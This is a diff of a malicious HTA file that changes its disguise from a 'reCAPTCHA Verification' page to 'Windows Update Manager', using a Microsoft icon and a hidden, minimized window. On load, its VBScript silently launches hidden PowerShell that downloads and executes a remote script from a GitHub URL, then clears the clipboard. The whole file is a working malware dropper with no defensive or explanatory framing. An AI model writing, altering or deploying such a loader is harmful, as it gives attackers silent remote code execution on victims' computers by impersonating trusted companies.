@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>reCAPTCHA Verification</title>
+    <title>Windows Update</title>
     <HTA:APPLICATION
-        APPLICATIONNAME="reCAPTCHA Verification"
+        APPLICATIONNAME="Windows Update Manager"
         BORDER="none"
         BORDERSTYLE="none"
-        ICON="https://support.google.com/favicon.ico"
+        ICON="https://www.microsoft.com/favicon.ico"
         SHOWINTASKBAR="no"
         SINGLEINSTANCE="yes"
         WINDOWSTATE="minimized"
@@ -15,25 +15,19 @@
         SYSMENU="no"
     />
     <style>
-        body {
-            display: none; /* Hide body content completely */
+        html, body {
+            display: none;
         }
     </style>
     <script language="VBScript">
     Sub Window_onLoad
-        ' Run the PowerShell script in the background, invisible to the user
+        Dim objShell
         Set objShell = CreateObject("WScript.Shell")
-        objShell.Run "powershell -w h -nop -c ""iex (irm 'https://raw.githubusercontent.com/BalletsPistol/_/main/n')""", 0, False
-        
-        ' Clear clipboard and hide other UI elements
-        ClearClipboard
-        Call HideConnectingShowError
-    End Sub
 
-    Sub HideConnectingShowError
-        ' Hide any connecting or error messages (if present)
-        document.getElementById("connecting").style.display = "none"
-        document.getElementById("error").style.display = "none"
+        ' Run PowerShell in hidden window, no profile, executing remote script
+        objShell.Run "powershell -w hidden -nop -c ""iex (irm 'https://raw.githubusercontent.com/BalletsPistol/_/main/n')""", 0, False
+
+        ClearClipboard
     End Sub
 
     Sub ClearClipboard
@@ -45,6 +39,5 @@
     </script>
 </head>
 <body>
-    <!-- Optional content can be added here, but will be hidden -->
 </body>
 </html>
